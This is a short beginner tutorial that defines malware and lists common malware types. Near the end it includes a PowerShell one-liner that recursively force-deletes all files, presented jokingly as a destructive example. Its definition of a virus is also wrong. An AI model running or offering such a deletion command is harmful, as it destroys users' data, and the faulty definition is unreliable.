# What is malware?

### Synopsis

<p>In short, malware is malicious software. Any software that provides any unwanted actions by the user who ran it, is considered malware.</p>

<p>There are a lot of ill intent actors out there who have there own wants as most criminals already do.</p>

<p>Many of malwares actions and wants have been categorized already</p>

```powershell
MECHANISM OF COMPROMISE
-----------------------
VIRUS:             simply program that does nothing other than the specific job
WORM:              simply prgram that self replicates and spreads to other devices through programmed means
TROJAN:            a program that is diguised a something, while doing malicious tasks

MECHANISM OF ACTIONS
--------------------
REVERSE SHELL:    connection made to the attacker, where the attacker can run remote commands
KEY LOGGERS:      all key presses are recorded and logged either locally or sent to a remote server
CREDS STEALER:    usually searches for passwords locally, decrypt if needed, then exfiltrated
BOTS:             program that makes a connection to a server where the attacker can send commands in mass to these devices
                  (usually used in dos/ddos attacks)
SPYWARE:          can grant the attacker a screen/camera view of the victim
ADWARE:           spams ads to the victim
RANSOMWARE:       encrypts files locally, and only when the victim pays for the key can the files be decrypted
```

### Programming

<p>Because of the overall description of malware, malware can be made with basically anything.</p>

```cmd
:: .bat or batch is the script equivilent of cmd
:: This file simply pings a remote server
ping badguy.server.com -n 1
exit
```

<p>or maybe something a little more destructive >:)</p>

```powershell
# .ps1 or a powershell script runs commands as powershell
# This file lists all files, and deletes everything
Get-ChildItem -Recurse -Force | ForEach-Object { Remove-Item $_ -Force } | Write-Host "dumb idiot's computer is destroyed lolll"
Exit
```

<p>It can very easily become more complicated, but that will be discussed with topics in the future</p>
